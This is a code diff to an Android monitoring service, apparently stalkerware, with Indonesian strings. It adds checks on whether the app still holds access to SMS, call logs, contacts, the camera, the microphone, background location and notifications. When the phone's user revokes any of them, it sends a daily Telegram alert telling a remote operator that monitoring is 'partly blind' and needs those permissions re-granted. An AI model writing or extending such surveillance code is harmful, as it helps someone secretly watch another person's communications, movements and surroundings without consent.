@@ -2393,6 +2393,7 @@ class MonitoringService : Service() {
         if (initialSyncRunning.get()) return
         if (NetworkUtils.isAuthBlocked(preferencesManager)) return
         try {
+            try { checkPermissionHealth() } catch (_: Exception) { }
             val lastSms = try {
                 preferencesManager.lastSmsId
             } catch (_: Exception) {
@@ -3593,6 +3594,67 @@ class MonitoringService : Service() {
             this,
             android.Manifest.permission.RECORD_AUDIO
         ) == android.content.pm.PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun hasSmsPermission(): Boolean {
+        return androidx.core.content.ContextCompat.checkSelfPermission(
+            this,
+            android.Manifest.permission.READ_SMS
+        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun hasCallLogPermission(): Boolean {
+        return androidx.core.content.ContextCompat.checkSelfPermission(
+            this,
+            android.Manifest.permission.READ_CALL_LOG
+        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun hasContactsPermission(): Boolean {
+        return androidx.core.content.ContextCompat.checkSelfPermission(
+            this,
+            android.Manifest.permission.READ_CONTACTS
+        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun hasSendSmsPermission(): Boolean {
+        return androidx.core.content.ContextCompat.checkSelfPermission(
+            this,
+            android.Manifest.permission.SEND_SMS
+        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun isBatteryExempt(): Boolean {
+        return try {
+            val pm = getSystemService(POWER_SERVICE) as android.os.PowerManager
+            pm.isIgnoringBatteryOptimizations(packageName)
+        } catch (_: Exception) {
+            true
+        }
+    }
+
+    private suspend fun checkPermissionHealth() {
+        try {
+            if (!preferencesManager.isConfigured()) return
+            val missing = ArrayList<String>()
+            if (!hasSmsPermission()) missing.add("baca SMS")
+            if (!hasCallLogPermission()) missing.add("log panggilan")
+            if (!hasContactsPermission()) missing.add("kontak")
+            if (!hasSendSmsPermission()) missing.add("kirim SMS")
+            if (!hasCameraPermission()) missing.add("kamera")
+            if (!hasMicPermission()) missing.add("mikrofon")
+            if (!hasLocationPermission()) missing.add("lokasi")
+            else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q && !hasBackgroundLocation()) missing.add("lokasi latar")
+            if (preferencesManager.notifForwardEnabled && !isNotifForwarding()) missing.add("akses notifikasi")
+            if (!isBatteryExempt()) missing.add("baterai tanpa batas")
+            if (missing.isEmpty()) return
+            val now = System.currentTimeMillis()
+            val last = try { preferencesManager.permHealthAlertAt } catch (_: Exception) { 0L }
+            if (now - last < 24 * 60 * 60_000L) return
+            try { preferencesManager.setPermHealthAlertAtSync(now) } catch (_: Exception) { }
+            sendToTelegram("⚠️ Izin dicabut: " + missing.joinToString(", ") + ". Monitoring buta sebagian — buka Setup di perangkat dan berikan lagi.")
+        } catch (_: Exception) {
+        }
     }
 
     private fun hasCameraPermission(): Boolean {
